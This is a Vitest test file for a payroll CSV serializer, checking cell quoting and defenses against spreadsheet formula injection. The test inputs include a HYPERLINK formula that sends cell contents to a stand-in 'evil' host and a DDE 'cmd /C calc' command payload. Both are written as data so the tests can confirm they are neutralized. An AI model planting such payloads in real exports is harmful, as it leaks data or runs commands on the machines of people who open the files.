/**
 * CSV serialization — quoting AND spreadsheet-formula neutralization.
 *
 * The payroll and labour-cost exports carry text other people wrote (an
 * employee's own name, and the note they type when clocking in), and the file
 * is opened by their manager in Excel. Quoting alone does not stop a cell being
 * executed, so these tests pin the neutralization as a security property, not a
 * formatting preference.
 */
import { describe, it, expect } from "vitest"
import { csvCell, toCsv } from "@/lib/csv"

describe("csvCell — quoting", () => {
  it("wraps every value in double quotes", () => {
    expect(csvCell("Anders")).toBe('"Anders"')
    expect(csvCell(7.5)).toBe('"7.5"')
  })

  it("doubles inner quotes so the column structure survives", () => {
    expect(csvCell('Anders "Ando" Holm')).toBe('"Anders ""Ando"" Holm"')
  })

  it("keeps commas and newlines inside the quoted cell", () => {
    expect(csvCell("Holm, Anders")).toBe('"Holm, Anders"')
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"')
  })

  it("renders null and undefined as an empty cell", () => {
    expect(csvCell(null)).toBe('""')
    expect(csvCell(undefined)).toBe('""')
    expect(csvCell("")).toBe('""')
  })
})

describe("csvCell — formula neutralization", () => {
  it.each([
    ["=1+1", "'=1+1"],
    ['=HYPERLINK("http://evil/?"&A1,"payroll")', '\'=HYPERLINK(""http://evil/?""&A1,""payroll"")'],
    ["+1+1", "'+1+1"],
    ["@SUM(A1:A9)", "'@SUM(A1:A9)"],
    ["-2+3", "'-2+3"],
    ["\tvalue", "'\tvalue"],
    ["\rvalue", "'\rvalue"],
  ])("neutralizes %j", (input, expectedInner) => {
    expect(csvCell(input)).toBe(`"${expectedInner}"`)
  })

  it("neutralizes the DDE command form", () => {
    expect(csvCell('=cmd|" /C calc"!A0')).toBe('"\'=cmd|"" /C calc""!A0"')
  })

  it("leaves plain numbers alone, negatives included", () => {
    // `-` is both a formula character and a minus sign. Prefixing a negative
    // figure would turn a payroll amount into text.
    expect(csvCell(-12.5)).toBe('"-12.5"')
    expect(csvCell("-12.5")).toBe('"-12.5"')
    expect(csvCell(0)).toBe('"0"')
  })

  it("does not touch a formula character that is not leading", () => {
    expect(csvCell("Ida=Hansen")).toBe('"Ida=Hansen"')
    expect(csvCell("shift 16:00-23:00")).toBe('"shift 16:00-23:00"')
  })
})

describe("toCsv", () => {
  it("joins cells with commas and rows with newlines, no trailing newline", () => {
    expect(toCsv([["Employee", "Hours"], ["Ida", 7]])).toBe('"Employee","Hours"\n"Ida","7"')
  })

  it("neutralizes a hostile note inside a real payroll row", () => {
    const csv = toCsv([
      ["Employee", "Hours", "Note"],
      ["Ida Hansen", 7, "=HYPERLINK(0)"],
    ])
    expect(csv).toContain('"\'=HYPERLINK(0)"')
    // No cell in the output may begin a formula.
    for (const cell of csv.split("\n").flatMap((line) => line.split(","))) {
      expect(cell.startsWith('"=')).toBe(false)
    }
  })
})
